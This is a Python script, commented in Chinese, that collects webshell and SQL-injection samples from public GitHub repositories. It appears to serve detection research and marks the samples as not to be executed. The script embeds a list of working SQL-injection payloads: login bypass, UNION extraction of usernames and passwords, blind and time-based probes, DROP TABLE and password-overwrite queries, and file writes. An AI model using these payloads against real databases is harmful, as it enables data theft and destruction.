"""
T1.5 · 恶意样本收集脚本

从公开安全研究仓库下载恶意脚本样本，包括 WebShell 和 SQL 注入载荷。
所有样本仅做静态文本存储和分析，禁止执行。

样本来源：
  - tennc/webshell: 最全的 WebShell 聚合仓库（PHP/Python/JSP）
  - JohnTroony/php-webshells: PHP WebShell 集合（有 Zenodo DOI，可学术引用）
  - payloadbox/sql-injection-payload-list: SQL 注入载荷分类列表

使用方式：
    python scripts/collect_malicious.py
    python scripts/collect_malicious.py --max-per-source 30  # 限制每个来源的最大样本数
"""

import os
import sys
import shutil
import random
import logging
import tarfile
import requests
from pathlib import Path

# 将项目根目录加入 sys.path
project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, project_root)

# 日志配置
logging.basicConfig(
    level=logging.INFO,
    format="  %(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger(__name__)

# 输出目录
WEBSHELL_DIR = os.path.join(project_root, "data", "samples", "webshell")
SQLI_DIR = os.path.join(project_root, "data", "samples", "sqli")

# 临时下载目录
TEMP_DIR = os.path.join(project_root, "data", "_temp_malicious")

# 恶意样本来源配置
SOURCES = [
    {
        "name": "tennc_webshell",
        "owner": "tennc",
        "repo": "webshell",
        "branch": "master",
        "category": "webshell",
        "subdirs": [""],  # 从根目录搜索
        "exclude_dirs": [".git", "README", "img", "images", "doc", "docs"],
        "extensions": [".php", ".py", ".jsp", ".asp", ".aspx"],
        "max_files": 100,
        "min_size": 20,
        "max_size": 100000,
    },
    {
        "name": "johnTroony_php_webshells",
        "owner": "JohnTroony",
        "repo": "php-webshells",
        "branch": "master",
        "category": "webshell",
        "subdirs": [""],
        "exclude_dirs": [".git", "README", ".github"],
        "extensions": [".php"],
        "max_files": 40,
        "min_size": 20,
        "max_size": 100000,
    },
    {
        "name": "payloadbox_sqli",
        "owner": "payloadbox",
        "repo": "sql-injection-payload-list",
        "branch": "master",
        "category": "sqli",
        "subdirs": [""],
        "exclude_dirs": [".git", "README", ".github", "img"],
        "extensions": [".txt", ".md"],
        "max_files": 80,
        "min_size": 10,
        "max_size": 50000,
    },
]


# 内置 SQL 注入 payload 列表（覆盖主要注入类型）
BUILTIN_SQLI_PAYLOADS = [
    # === 通用绕过 ===
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 1=1 -- -",
    "1' OR '1'='1",
    "1 OR 1=1",
    "admin'--",
    "admin' --",
    "admin'#",
    # === UNION 注入 ===
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL --",
    "' UNION SELECT 1,2,3 --",
    "' UNION SELECT 1,2,3,4 --",
    "' UNION SELECT 1,2,3,4,5 --",
    "' UNION ALL SELECT 1,2,3 --",
    "' UNION SELECT user(),2,3 --",
    "' UNION SELECT database(),2,3 --",
    "' UNION SELECT version(),2,3 --",
    "' UNION SELECT table_name,2,3 FROM information_schema.tables --",
    "' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' --",
    "' UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables WHERE table_schema=database() --",
    "' UNION SELECT group_concat(column_name),2,3 FROM information_schema.columns WHERE table_name='users' --",
    "' UNION SELECT group_concat(username,0x3a,password),2,3 FROM users --",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL --",
    # === 布尔盲注 ===
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' AND SUBSTRING(@@version,1,1)='5' --",
    "' AND SUBSTRING(@@version,1,1)='8' --",
    "' AND (SELECT COUNT(*) FROM users)>0 --",
    "' AND ASCII(SUBSTRING((SELECT user()),1,1))>50 --",
    "' AND ASCII(SUBSTRING((SELECT user()),1,1))>100 --",
    "' AND (SELECT LENGTH(database()))>5 --",
    "' AND (SELECT LENGTH(database()))>10 --",
    "1' AND SLEEP(0)=0 --",
    # === 时间盲注 ===
    "' AND SLEEP(5) --",
    "' AND SLEEP(10) --",
    "' AND BENCHMARK(5000000,MD5('test')) --",
    "' AND IF(1=1,SLEEP(5),0) --",
    "' AND IF(1=2,SLEEP(5),0) --",
    "' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0) --",
    "' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0) --",
    "1; WAITFOR DELAY '0:0:5' --",
    "1; WAITFOR DELAY '0:0:10' --",
    # === 报错注入 ===
    "' AND extractvalue(1,concat(0x7e,(SELECT user()))) --",
    "' AND updatexml(1,concat(0x7e,(SELECT user())),1) --",
    "' AND updatexml(1,concat(0x7e,(SELECT version())),1) --",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
    "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()))) --",
    # === 堆叠注入 ===
    "1; SELECT * FROM users --",
    "1; DROP TABLE users --",
    "1; INSERT INTO users VALUES('admin','pass') --",
    "1; UPDATE users SET password='hacked' WHERE username='admin' --",
    # === 编码绕过 ===
    "' UNION SELECT 1,2,3-- -",
    "%27%20OR%201%3D1--",
    "0x27 OR 1=1 --",
    "CHAR(39) OR 1=1 --",
    # === 注释绕过 ===
    "'/**/OR/**/1=1--",
    "'/*!OR*/ 1=1--",
    "' OR 1=1;%00",
    "' OR 1=1--%0a",
    # === 空格绕过 ===
    "'OR 1=1--",
    "'\tOR\t1=1--",
    "'OR(1=1)--",
    # === 大小写混合 ===
    "' Or 1=1 --",
    "' oR 1=1 --",
    "' Or '1'='1",
    # === 双重 URL 编码 ===
    "%2527 OR 1=1--",
    # === 其他变种 ===
    "' OR ''='",
    "' OR 'x'='x",
    "' OR 'a'='a' --",
    "' OR 1=1 LIMIT 1 --",
    "' OR 1=1 LIMIT 1,1 --",
    "' OR 1=1 INTO OUTFILE '/tmp/test' --",
    "' OR 1=1 INTO DUMPFILE '/tmp/test' --",
    "' OR 1=1 AND UNION SELECT 1 --",
    "-1 UNION SELECT 1,2,3 --",
    "-1' UNION SELECT 1,2,3 --",
    "1 UNION SELECT 1,2,3 --",
    "1' UNION SELECT 1,2,3 --",
]


def generate_builtin_sqli(output_dir: str) -> int:
    """
    生成内置 SQL 注入 payload 样本文件。
    作为 GitHub 仓库下载失败时的后备方案。

    Args:
        output_dir: 输出目录

    Returns:
        生成的样本文件数
    """
    count = 0
    for i, payload in enumerate(BUILTIN_SQLI_PAYLOADS, 1):
        fname = f"builtin_sqli_payload_{i:03d}.txt"
        fpath = os.path.join(output_dir, fname)
        try:
            with open(fpath, "w", encoding="utf-8") as f:
                f.write(payload)
            count += 1
        except Exception as e:
            logger.warning(f"写入失败 {fname}: {e}")
    return count


def clone_repo(source: dict, dest_dir: str) -> bool:
    """
    通过 tarball 下载 GitHub 仓库（比 git clone 快很多）。
    每次调用都强制重新下载，避免残留目录干扰。

    Args:
        source: 来源配置字典（含 owner, repo, branch）
        dest_dir: 目标目录

    Returns:
        是否成功
    """
    # 强制清理已有目录，避免残留 .git 干扰
    if os.path.exists(dest_dir):
        shutil.rmtree(dest_dir, ignore_errors=True)

    owner = source["owner"]
    repo = source["repo"]
    branch = source.get("branch", "master")
    tarball_url = f"https://codeload.github.com/{owner}/{repo}/tar.gz/refs/heads/{branch}"

    logger.info(f"正在下载: {tarball_url}")
    os.makedirs(dest_dir, exist_ok=True)

    try:
        tarball_path = os.path.join(dest_dir, "_download.tar.gz")
        max_retries = 3

        for attempt in range(1, max_retries + 1):
            try:
                response = requests.get(tarball_url, stream=True, timeout=300)
                response.raise_for_status()

                downloaded = 0
                with open(tarball_path, "wb") as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
                        downloaded += len(chunk)

                total_mb = downloaded / (1024 * 1024)
                logger.info(f"下载完成: {total_mb:.1f} MB")
                break

            except (requests.exceptions.ChunkedEncodingError,
                    requests.exceptions.ConnectionError,
                    requests.exceptions.Timeout) as e:
                if attempt < max_retries:
                    logger.warning(f"下载中断（尝试 {attempt}/{max_retries}）: {type(e).__name__}")
                    import time
                    time.sleep(5 * attempt)
                else:
                    raise

        logger.info(f"正在解压...")
        with tarfile.open(tarball_path, "r:gz") as tar:
            for member in tar.getmembers():
                # 跳过隐藏文件和目录（.gitignore, .github 等，容易触发 Windows 文件锁）
                if any(part.startswith(".") for part in member.name.split("/")):
                    continue
                try:
                    tar.extract(member, dest_dir)
                except (PermissionError, OSError) as e:
                    logger.warning(f"解压跳过: {member.name}: {e}")

        try:
            os.remove(tarball_path)
        except PermissionError:
            logger.warning(f"删除 tarball 失败（文件被锁定），忽略")

        # tarball 解压后有一个顶层目录，移到 dest_dir 下
        entries = os.listdir(dest_dir)
        if len(entries) == 1:
            top_dir = os.path.join(dest_dir, entries[0])
            if os.path.isdir(top_dir):
                for item in os.listdir(top_dir):
                    src = os.path.join(top_dir, item)
                    dst = os.path.join(dest_dir, item)
                    try:
                        shutil.move(src, dst)
                    except (PermissionError, OSError) as e:
                        logger.warning(f"移动文件失败 {item}: {e}")
                try:
                    os.rmdir(top_dir)
                except OSError:
                    pass

        logger.info(f"解压完成: {dest_dir}")
        return True

    except requests.exceptions.HTTPError as e:
        if branch == "master":
            logger.warning(f"master 分支失败，尝试 main 分支...")
            source["branch"] = "main"
            shutil.rmtree(dest_dir, ignore_errors=True)
            return clone_repo(source, dest_dir)
        logger.error(f"下载失败: {e}")
        return False
    except Exception as e:
        logger.error(f"下载异常: {type(e).__name__}: {e}")
        return False


def collect_files_from_repo(
    repo_dir: str,
    subdirs: list[str],
    exclude_dirs: list[str],
    extensions: list[str],
    max_files: int,
    min_size: int,
    max_size: int,
) -> list[str]:
    """
    从克隆的仓库中收集符合条件的文件。
    """
    collected = []
    exclude_set = set(exclude_dirs)

    for subdir in subdirs:
        search_path = os.path.join(repo_dir, subdir) if subdir else repo_dir
        if not os.path.exists(search_path):
            logger.warning(f"子目录不存在: {search_path}")
            continue

        for root, dirs, files in os.walk(search_path):
            # 排除指定目录
            dirs[:] = [d for d in dirs if d not in exclude_set and not d.startswith(".")]

            for fname in files:
                ext = os.path.splitext(fname)[1].lower()
                if ext not in extensions:
                    continue

                fpath = os.path.join(root, fname)
                fsize = os.path.getsize(fpath)

                if fsize < min_size or fsize > max_size:
                    continue

                collected.append(fpath)

                if len(collected) >= max_files:
                    return collected

    return collected


def copy_samples(
    file_list: list[str],
    source_name: str,
    output_dir: str,
    category: str,
) -> int:
    """
    将收集的文件复制到输出目录。

    对于 SQL 注入载荷（.txt/.md 文件），如果单个文件包含多个 payload，
    会将其拆分为独立样本文件。
    """
    count = 0

    if category == "sqli":
        # SQL 注入载荷：每个文件可能包含多个 payload，按行拆分
        count = split_sqli_payloads(file_list, source_name, output_dir)
    else:
        # WebShell：直接复制整个文件
        for fpath in file_list:
            orig_name = os.path.basename(fpath)
            name_parts = os.path.splitext(orig_name)
            new_name = f"{source_name}_{name_parts[0]}{name_parts[1]}"

            dest_path = os.path.join(output_dir, new_name)
            counter = 1
            while os.path.exists(dest_path):
                new_name = f"{source_name}_{name_parts[0]}_{counter}{name_parts[1]}"
                dest_path = os.path.join(output_dir, new_name)
                counter += 1

            try:
                shutil.copy(fpath, dest_path)
                count += 1
            except Exception as e:
                # 后备：二进制模式读取写入（解决 Windows [Errno 22] 问题）
                try:
                    with open(fpath, "rb") as src:
                        content = src.read()
                    with open(dest_path, "wb") as dst:
                        dst.write(content)
                    count += 1
                except Exception as e2:
                    logger.warning(f"复制失败 {fpath}: {e} -> {e2}")

    return count


def split_sqli_payloads(
    file_list: list[str],
    source_name: str,
    output_dir: str,
) -> int:
    """
    将 SQL 注入载荷文件按行拆分为独立样本。
    每个非空行（去除注释和标题）作为一个独立 payload 文件。

    Args:
        file_list: 源文件路径列表
        source_name: 来源名称
        output_dir: 输出目录

    Returns:
        生成的样本文件数
    """
    count = 0
    batch_counter = 0

    for fpath in file_list:
        try:
            with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
        except Exception as e:
            logger.warning(f"读取失败 {fpath}: {e}")
            continue

        for line in lines:
            line = line.strip()

            # 跳过空行、注释、标题行
            if not line:
                continue
            if line.startswith("#") or line.startswith("//"):
                continue
            if line.startswith("##") or line.startswith("==="):
                continue
            # 跳过过短的行（可能是标题或说明）
            if len(line) < 5:
                continue

            # 生成文件名
            batch_counter += 1
            new_name = f"{source_name}_payload_{batch_counter:04d}.txt"
            dest_path = os.path.join(output_dir, new_name)

            try:
                with open(dest_path, "w", encoding="utf-8") as f:
                    f.write(line)
                count += 1
            except Exception as e:
                logger.warning(f"写入失败: {e}")

    return count


def main():
    import argparse

    parser = argparse.ArgumentParser(description="T1.5 · 恶意样本收集")
    parser.add_argument(
        "--max-per-source", type=int, default=None,
        help="限制每个来源的最大样本数（调试用）"
    )
    parser.add_argument(
        "--keep-temp", action="store_true",
        help="保留临时克隆目录（调试用）"
    )
    args = parser.parse_args()

    print("=" * 60)
    print("  T1.5 · 恶意样本收集")
    print("  [安全提示] 所有样本仅做静态文本存储，禁止执行")
    print("=" * 60)

    # 创建输出目录
    os.makedirs(WEBSHELL_DIR, exist_ok=True)
    os.makedirs(SQLI_DIR, exist_ok=True)
    os.makedirs(TEMP_DIR, exist_ok=True)

    total_collected = 0
    stats = {}

    for source in SOURCES:
        source_name = source["name"]
        category = source["category"]
        print(f"\n{'─'*60}")
        print(f"  来源: {source_name} ({source['repo']})")
        print(f"  类别: {category}")
        print(f"{'─'*60}")

        # 下载仓库
        repo_dir = os.path.join(TEMP_DIR, source_name)
        if not clone_repo(source, repo_dir):
            print(f"  [跳过] 下载失败，跳过此来源")
            stats[source_name] = 0
            continue

        # 收集文件
        max_files = args.max_per_source or source["max_files"]
        files = collect_files_from_repo(
            repo_dir=repo_dir,
            subdirs=source["subdirs"],
            exclude_dirs=source["exclude_dirs"],
            extensions=source["extensions"],
            max_files=max_files,
            min_size=source["min_size"],
            max_size=source["max_size"],
        )

        # 随机采样
        if len(files) > max_files:
            random.seed(42)
            files = random.sample(files, max_files)

        print(f"  收集到 {len(files)} 个文件")

        # 复制到输出目录
        output_dir = WEBSHELL_DIR if category == "webshell" else SQLI_DIR
        copied = copy_samples(files, source_name, output_dir, category)
        print(f"  成功生成 {copied} 个样本到 {output_dir}")

        stats[source_name] = copied
        total_collected += copied

    # 清理临时目录
    if not args.keep_temp:
        print(f"\n  清理临时目录: {TEMP_DIR}")
        shutil.rmtree(TEMP_DIR, ignore_errors=True)

    # 后备：如果 SQLi 样本不足，使用内置 payload 列表补充
    sqli_count = sum(v for k, v in stats.items() if "sqli" in k)
    if sqli_count < 50:
        print(f"\n{'─'*60}")
        print(f"  SQLi 样本不足（{sqli_count} 个），使用内置 payload 列表补充")
        print(f"{'─'*60}")
        fallback_count = generate_builtin_sqli(SQLI_DIR)
        print(f"  内置 payload 生成 {fallback_count} 个样本")
        stats["builtin_sqli"] = fallback_count
        total_collected += fallback_count

    # 汇总
    print(f"\n{'='*60}")
    print("  恶意样本收集完成")
    print(f"{'='*60}")
    for name, count in stats.items():
        print(f"  {name:30s}: {count:4d} 个")
    print(f"  {'─'*40}")
    print(f"  {'总计':30s}: {total_collected:4d} 个")
    print(f"\n  WebShell 目录: {WEBSHELL_DIR}")
    print(f"  SQLi 目录:     {SQLI_DIR}")


if __name__ == "__main__":
    main()
